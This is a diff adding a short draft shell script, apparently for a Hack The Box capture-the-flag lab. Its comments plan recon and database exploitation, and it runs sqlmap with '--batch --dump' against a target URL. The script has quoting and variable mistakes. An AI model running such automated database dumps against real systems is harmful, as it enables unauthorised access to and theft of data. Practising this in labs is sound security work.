@@ -1,0 +1,14 @@
+###Final test
+## rough draft
+# visit target host and recon for entry point
+# find exploit for DB, find db type (probably mysql), find db table, determine if possible dba
+
+TGTHOST=""
+UINHOST=""
+UINPROTO=""
+
+TGTHOST=$UINHOST$UINPROTO
+
+sqlmap --batch --dump -u '$TGTHOST'
+
+# Flag regex: (HTB{.+})
